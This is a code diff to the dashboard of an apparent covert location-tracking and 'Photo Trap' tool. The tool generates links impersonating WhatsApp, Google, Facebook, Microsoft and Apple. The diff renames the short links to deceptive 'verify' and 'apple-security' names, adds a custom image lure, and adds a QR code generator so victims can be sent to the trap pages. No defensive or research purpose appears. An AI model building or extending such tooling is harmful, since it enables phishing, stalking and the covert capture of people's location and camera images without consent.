@@ -55,7 +55,7 @@
         #infoPanel .label { opacity: 0.6; }
         #infoPanel .value { font-weight: 500; color: #fff; }
 
-        #map { height: calc(100vh - 220px); width: 100vw; }
+        #map { height: calc(100vh - 280px); width: 100vw; }
 
         #actions {
             position: absolute;
@@ -83,21 +83,22 @@
         #actions .btn-clear { background: #e94560; color: white; }
         #actions .btn-clear:hover { background: #c62840; }
 
-        #brandSelector {
+        /* Sections */
+        #brandSelector, #photoTrapSection, #qrSection {
             background: #16213e;
-            color: #e0e0e0;
             padding: 10px 20px;
+            border-bottom: 1px solid #0f3460;
             display: flex;
             flex-wrap: wrap;
             align-items: center;
-            gap: 10px 15px;
-            border-bottom: 1px solid #0f3460;
-            font-size: 13px;
-            position: relative;
-            z-index: 1000;
+            gap: 10px;
         }
-        #brandSelector label { opacity: 0.7; }
-        #brandSelector select {
+        #brandSelector label, #photoTrapSection label, #qrSection label {
+            color: #e0e0e0;
+            font-size: 13px;
+            opacity: 0.7;
+        }
+        #brandSelector select, #photoTrapSection select, #qrSection select {
             background: #0f3460;
             color: white;
             border: 1px solid #1a4a6e;
@@ -106,20 +107,7 @@
             font-size: 13px;
             cursor: pointer;
         }
-        #brandSelector select:hover { border-color: #4caf50; }
-        #brandSelector .copy-link {
-            background: #4caf50;
-            color: white;
-            border: none;
-            padding: 6px 14px;
-            border-radius: 6px;
-            font-size: 12px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: all 0.2s;
-        }
-        #brandSelector .copy-link:hover { background: #388e3c; }
-        #brandSelector .link-display {
+        #brandSelector .link-display, #photoTrapSection .link-display {
             background: #0f3460;
             padding: 6px 12px;
             border-radius: 6px;
@@ -130,6 +118,17 @@
             min-width: 200px;
             color: #4caf50;
         }
+        #brandSelector .copy-link, #photoTrapSection .copy-link, #qrSection .copy-link {
+            background: #4caf50;
+            color: white;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        #brandSelector .copy-link:hover, #photoTrapSection .copy-link:hover, #qrSection .copy-link:hover { background: #388e3c; }
         #brandSelector .short-link {
             color: #ffc107;
             font-size: 13px;
@@ -139,58 +138,33 @@
             border-radius: 6px;
             font-family: monospace;
         }
-
-        /* Photo Trap Section */
-        #photoTrapSection {
-            background: #16213e;
-            padding: 10px 20px;
-            border-bottom: 1px solid #0f3460;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            gap: 10px;
-        }
-        #photoTrapSection label {
-            color: #e0e0e0;
-            font-size: 13px;
-            opacity: 0.7;
-        }
-        #photoTrapSection select {
+        #qrSection input {
             background: #0f3460;
             color: white;
             border: 1px solid #1a4a6e;
             padding: 6px 12px;
             border-radius: 6px;
-            font-size: 13px;
-            cursor: pointer;
-        }
-        #photoTrapSection .link-display {
-            background: #0f3460;
-            padding: 6px 12px;
-            border-radius: 6px;
-            font-family: monospace;
             font-size: 12px;
-            word-break: break-all;
             flex: 1;
-            min-width: 200px;
-            color: #4caf50;
+            min-width: 150px;
         }
-        #photoTrapSection .copy-link {
-            background: #4caf50;
-            color: white;
-            border: none;
-            padding: 6px 14px;
-            border-radius: 6px;
-            font-size: 12px;
-            cursor: pointer;
-            font-weight: 600;
+        #qrContainer {
+            display: none;
+            background: #0f3460;
+            padding: 10px;
+            border-radius: 8px;
+            width: 100%;
+            text-align: center;
         }
-        #photoTrapSection .copy-link:hover { background: #388e3c; }
+        #qrContainer img { max-width: 200px; border-radius: 8px; }
+        #qrSection .btn-qr { background: #4285f4; color: white; border: none; padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: 600; }
+        #qrSection .btn-qr:hover { background: #3367d6; }
+        #qrSection .btn-download { background: #4caf50; color: white; border: none; padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: 600; margin-top: 8px; }
+        #qrSection .btn-download:hover { background: #388e3c; }
 
         @media (max-width: 768px) {
-            #brandSelector { flex-direction: column; align-items: stretch; }
-            #brandSelector .link-display { min-width: auto; }
-            #photoTrapSection { flex-direction: column; align-items: stretch; }
+            #brandSelector, #photoTrapSection, #qrSection { flex-direction: column; align-items: stretch; }
+            #brandSelector .link-display, #photoTrapSection .link-display { min-width: auto; }
         }
 
         #historySection {
@@ -264,7 +238,7 @@
     </div>
 </div>
 
-<!-- Brand Selector with short links -->
+<!-- Brand Selector with updated short links -->
 <div id="brandSelector">
     <label for="brandSelect">🔗 Send Link:</label>
     <select id="brandSelect">
@@ -276,10 +250,10 @@
     </select>
     <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
     <button class="copy-link" id="copyLinkBtn">📋 Copy Link</button>
-    <span class="short-link" id="shortLinkDisplay">rebrand.ly/z1izp36</span>
+    <span class="short-link" id="shortLinkDisplay">rebrand.ly/verify-wa</span>
 </div>
 
-<!-- Photo Trap Section -->
+<!-- Photo Trap -->
 <div id="photoTrapSection">
     <label>📷 Photo Trap:</label>
     <select id="photoTemplateSelect">
@@ -289,10 +263,31 @@
         <option value="microsoft">⬡ Microsoft</option>
         <option value="apple"> Apple</option>
     </select>
+    <input type="text" id="customImageInput" placeholder="Image URL (optional)" style="background:#0f3460;color:white;border:1px solid #1a4a6e;padding:6px 12px;border-radius:6px;font-size:12px;flex:1;min-width:150px;">
     <span class="link-display" id="photoLinkDisplay">https://location-tracker-cn7m.onrender.com/photo?template=whatsapp</span>
     <button class="copy-link" id="copyPhotoLinkBtn">📋 Copy</button>
 </div>
 
+<!-- QR Code Generator -->
+<div id="qrSection">
+    <label>📱 QR Code:</label>
+    <select id="qrTemplateSelect">
+        <option value="google">🔵 Google</option>
+        <option value="whatsapp" selected>💬 WhatsApp</option>
+        <option value="facebook">🔷 Facebook</option>
+        <option value="microsoft">⬡ Microsoft</option>
+        <option value="apple"> Apple</option>
+    </select>
+    <input type="text" id="qrImageInput" placeholder="Custom image URL (optional)">
+    <button class="btn-qr" id="generateQrBtn">🔄 Generate QR</button>
+    <div id="qrContainer">
+        <img id="qrCodeImg" src="" alt="QR Code">
+        <br>
+        <button class="btn-download" id="downloadQrBtn">💾 Download QR</button>
+    </div>
+</div>
+
+<!-- Info Panel -->
 <div id="infoPanel">
     <div class="item"><span class="label">👥 Active Users:</span><span class="value" id="userCountDisplay">0</span></div>
     <div class="item"><span class="label">📊 Total Locations:</span><span class="value" id="totalLocationsDisplay">0</span></div>
@@ -320,12 +315,15 @@
     const RENDER_URL = '';
     const BASE_URL = 'https://location-tracker-cn7m.onrender.com';
 
+    // =============================================
+    // UPDATED REBRANDLY SHORT LINKS
+    // =============================================
     const SHORT_LINKS = {
-        google: 'rebrand.ly/1gl3gng',
-        whatsapp: 'rebrand.ly/z1izp36',
-        facebook: 'rebrand.ly/un2zc75',
-        microsoft: 'rebrand.ly/w9mb10j',
-        apple: 'rebrand.ly/zyvtisi'
+        google: 'rebrand.ly/verify-google',
+        whatsapp: 'rebrand.ly/verify-wa',
+        facebook: 'rebrand.ly/verify-FACEBOOK',
+        microsoft: 'rebrand.ly/verify-ms',
+        apple: 'rebrand.ly/apple-security'
     };
 
     // =============================================
@@ -373,16 +371,22 @@
     // PHOTO TRAP
     // =============================================
     const photoTemplateSelect = document.getElementById('photoTemplateSelect');
+    const customImageInput = document.getElementById('customImageInput');
     const photoLinkDisplay = document.getElementById('photoLinkDisplay');
     const copyPhotoLinkBtn = document.getElementById('copyPhotoLinkBtn');
 
     function updatePhotoLink() {
         const template = photoTemplateSelect.value;
-        const url = BASE_URL + '/photo?template=' + template;
+        const customImg = customImageInput.value.trim();
+        let url = BASE_URL + '/photo?template=' + template;
+        if (customImg) {
+            url += '&img=' + encodeURIComponent(customImg);
+        }
         photoLinkDisplay.textContent = url;
     }
 
     photoTemplateSelect.addEventListener('change', updatePhotoLink);
+    customImageInput.addEventListener('input', updatePhotoLink);
     updatePhotoLink();
 
     copyPhotoLinkBtn.addEventListener('click', function() {
@@ -405,6 +409,35 @@
                 copyPhotoLinkBtn.textContent = originalText;
             }, 2000);
         });
+    });
+
+    // =============================================
+    // QR CODE GENERATOR
+    // =============================================
+    const qrTemplateSelect = document.getElementById('qrTemplateSelect');
+    const qrImageInput = document.getElementById('qrImageInput');
+    const generateQrBtn = document.getElementById('generateQrBtn');
+    const qrContainer = document.getElementById('qrContainer');
+    const qrCodeImg = document.getElementById('qrCodeImg');
+    const downloadQrBtn = document.getElementById('downloadQrBtn');
+
+    generateQrBtn.addEventListener('click', function() {
+        const template = qrTemplateSelect.value;
+        const customImg = qrImageInput.value.trim();
+        let url = BASE_URL + '/photo?template=' + template;
+        if (customImg) {
+            url += '&img=' + encodeURIComponent(customImg);
+        }
+        const qrApiUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' + encodeURIComponent(url);
+        qrCodeImg.src = qrApiUrl;
+        qrContainer.style.display = 'block';
+    });
+
+    downloadQrBtn.addEventListener('click', function() {
+        const link = document.createElement('a');
+        link.download = 'photo-trap-qr.png';
+        link.href = qrCodeImg.src;
+        link.click();
     });
 
     // =============================================
